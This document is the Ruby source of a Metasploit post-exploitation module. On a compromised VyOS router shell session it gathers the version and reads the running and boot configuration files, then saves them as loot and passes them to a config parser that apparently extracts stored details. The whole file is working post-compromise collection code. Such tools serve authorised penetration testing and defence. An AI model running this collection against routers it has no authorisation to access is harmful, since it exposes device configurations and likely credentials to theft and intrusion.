##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::VYOS

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VyOS Gather Device General Information',
        'Description' => %q{
          This module collects VyOS device information and configuration.
        },
        'License' => MSF_LICENSE,
        'Author' => ['h00die'],
        'SessionTypes' => ['shell']
      )
    )
  end

  def run
    # Clear the screen
    session.shell_command("\n")

    # Get version info
    print_status('Getting version information')
    # 1.1.8, and prob before
    version_out = session.shell_command('/opt/vyatta/bin/vyatta-show-version')
    if version_out.include?('such file or directory')
      # 1.3, and prob newer
      version_out = session.shell_command('/usr/libexec/vyos/op_mode/show_version.py')
    end

    ver_loc = store_loot('vyos.version',
                         'text/plain',
                         session,
                         version_out.strip,
                         'version.txt',
                         'VyOS Version')

    # Print the version of VERBOSE set to true.
    vprint_good(version_out)
    vprint_good("Version information stored in to loot #{ver_loc}")

    # run additional information gathering
    enum_configs
  end

  # run commands found in exec mode under privilege 1
  def enum_configs
    host = session.session_host
    port = session.session_port
    exec_commands = [
      {
        'cmd' => 'cat /config/config',
        'fn' => 'get_running_config',
        'desc' => 'Get Running Config on VyOS Device'
      },
      {
        'cmd' => 'cat /config/config.boot',
        'fn' => 'get_config',
        'desc' => 'Get Boot Config on VyOS Device'
      },
    ]
    exec_commands.each do |ec|
      command = ec['cmd']
      cmd_out = session.shell_command(command).gsub(command, '')
      print_status("Gathering info from #{command}")
      vyos_config_eater(host, port, cmd_out.strip)
    end
  end
end
